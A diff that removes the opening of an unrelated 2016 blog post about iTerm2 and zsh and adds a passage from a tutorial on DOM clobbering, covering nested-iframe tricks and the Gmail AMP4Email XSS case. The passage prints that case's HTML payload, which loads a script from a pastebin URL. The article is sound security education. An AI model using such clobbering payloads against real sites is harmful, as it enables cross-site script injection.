@@ -1,10 +1,176 @@
----
-title: '[Experience] iTerm2 + zsh, creating a better working environment'
-date: 2016-01-03 14:21
-catalog: true
-header-img: "/img/header_img/article-bg.png"
-tags: [Tool]
-categories:
-  - Others
----
-For those who write code, no matter which programming language or development environment they use, they will need to execute some commands at some point. This is when they will open the terminal and start typing commands. The most commonly used commands are `cd`, `ls`, `git`, `ssh`, `rsync`, etc. Howe
+## More levels of DOM Clobbering
+
+As mentioned earlier, three layers or conditionally four layers are already the limit. Is there a way to break through the limit?
+
+According to the method given in [DOM Clobbering strikes back](https://portswigger.net/research/dom-clobbering-strikes-back), there is, using an iframe!
+
+When you create an iframe and give it a name, you can use this name to refer to the window inside the iframe, so you can do this:
+
+``` html
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe name="config" srcdoc='
+    <a id="apiUrl"></a>
+  '></iframe>
+  <script>
+    setTimeout(() => {
+      console.log(config.apiUrl) // <a id="apiUrl"></a>
+    }, 500)
+  </script>
+</body>
+</html>
+```
+
+The reason why setTimeout is needed here is that the iframe is not loaded synchronously, so it takes some time to correctly retrieve the contents inside the iframe.
+
+With the help of the iframe, you can create more levels:
+
+``` html
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe name="moreLevel" srcdoc='
+    <form id="config"></form>
+    <form id="config" name="prod">
+      <input name="apiUrl" value="123" />
+    </form>
+  '></iframe>
+  <script>
+    setTimeout(() => {
+      console.log(moreLevel.config.prod.apiUrl.value) //123
+    }, 500)
+  </script>
+</body>
+</html>
+```
+
+In theory, you can use another iframe inside the iframe to achieve an infinite number of levels of DOM clobbering, but I tried it and found that there may be some encoding issues that need to be addressed, for example, like this:
+
+``` html
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe name="level1" srcdoc='
+    <iframe name="level2" srcdoc="
+      <iframe name="level3"></iframe>
+    "></iframe>
+  '></iframe>
+  <script>
+    setTimeout(() => {
+      console.log(level1.level2.level3) // undefined
+    }, 500)
+  </script>
+</body>
+</html>
+```
+
+It will print undefined, but if you remove the double quotes from the level3 and write it directly as `name=level3`, you can successfully print out the contents. I guess it is due to some parsing issues with single and double quotes, and I haven't found a solution yet. Only this attempt is okay, but it will fail if you go further down:
+
+``` html
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe name="level1" srcdoc="
+    <iframe name=&quot;level2&quot; srcdoc=&quot;
+      <iframe name='level3' srcdoc='
+        <iframe name=level4></iframe>
+      '></iframe>
+    &quot;></iframe>
+  "></iframe>
+  <script>
+    setTimeout(() => {
+      console.log(level1.level2.level3.level4)
+    }, 500)
+  </script>
+</body>
+</html>
+```
+
+But in real life, you probably won't go that deep, so four or five layers are already enough.
+
+Update on August 14, 2021:
+Thanks to a friend's notification, you can achieve an infinite number of layers like this:
+
+``` html
+<iframe name=a srcdoc="
+  <iframe name=b srcdoc=&quot
+    <iframe name=c srcdoc=&amp;quot;
+      <iframe name=d srcdoc=&amp;amp;quot;
+        <iframe name=e srcdoc=&amp;amp;amp;quot;
+          <iframe name=f srcdoc=&amp;amp;amp;amp;quot;
+            <div id=g>123</div>
+          &amp;amp;amp;amp;quot;></iframe>
+        &amp;amp;amp;quot;></iframe>
+      &amp;amp;quot;></iframe>
+    &amp;quot;></iframe>
+  &quot></iframe>
+"></iframe>
+```
+
+## Case Study: Gmail AMP4Email XSS
+
+In 2019, there was a vulnerability in Gmail that was attacked through DOM clobbering. The complete write-up is here: [XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/), and I will briefly describe the process below (all content is taken from the above article). 
+
+In short, in Gmail, you can use some AMP functions, and Google's validator for this format is very strict, so it is not possible to XSS through normal methods.
+
+But someone found that they could set an id on an HTML element, and when they set a `<a id="AMP_MODE">`, an error suddenly appeared in the console loading the script, and one of the segments in the URL was undefined. After studying the code carefully, there was a piece of code that looked like this:
+
+``` js
+var script = window.document.createElement("script");
+script.async = false;
+
+var loc;
+if (AMP_MODE.test && window.testLocation) {
+    loc = window.testLocation
+} else {
+    loc = window.location;
+}
+
+if (AMP_MODE.localDev) {
+    loc = loc.protocol + "//" + loc.host + "/dist"
+} else {
+    loc = "https://cdn.ampproject.org";
+}
+
+var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
+b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";
+
+document.head.appendChild(b);
+```
+
+If we can make both `AMP_MODE.test` and `AMP_MODE.localDev` truthy, and then set `window.testLocation`, we can load any script!
+
+So the exploit would look like this:
+
+``` html
+// 讓 AMP_MODE.test 跟 AMP_MODE.localDev 有東西
+<a id="AMP_MODE" name="localDev"></a>
+<a id="AMP_MODE" name="test"></a>
+
+// 設置 testLocation.protocol
+<a id="testLocation"></a>
+<a id="testLocation" name="protocol" 
+   href="https://pastebin.com/raw/0tn8z0rG#"></a>
+```
+
+Finally, we can successfully load any script and achieve XSS! (However, the author was only able to get this far before being blocked by CSP).
+
+This is probably one of the most famous cases of DOM Clobbering.
+
+## Conclusion
+
+Although the use cases for DOM Clobbering are limited, it is a very interesting attack method! And if you don't know about this feature, you may not have thought about how HTML can affect the content of global variables.
+
+If you are interested in this attack method, you can refer to PortSwigger's [article](https://portswigger.net/web-security/dom-based/dom-clobbering), which provides two labs for you to try this attack method yourself. Just reading about it is not enough, you need to actually attack to fully understand it.
+
+References:
+
+1. [Expanding XSS with Dom Clobbering](http://blog.zeddyu.info/2020/03/04/Dom-Clobbering/#HTML-Relationships)
+2. [DOM Clobbering strikes back](https://portswigger.net/research/dom-clobbering-strikes-back)
+3. [DOM Clobbering Attack Learning Record.md](https://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)
+4. [DOM Clobbering Learning Record](https://ljdd520.github.io/2020/03/14/DOM-Clobbering%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)
+5. [XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)
+6. [Is there a spec that the id of elements should be made global variable?](https://stackoverflow.com/questions/6381425/is-there-a-spec-that-the-id-of-elements-should-be-made-global-variable)
+7. [Why don't we just use element IDs as identifiers in JavaScript?](https://stackoverflow.com/questions/25325221/why-dont-we-just-use-element-ids-as-identifiers-in-javascript)
+8. [Do DOM tree elements with ids become global variables?](https://stackoverflow.com/questions/3434278/do-dom-tree-elements-with-ids-become-global-variables)
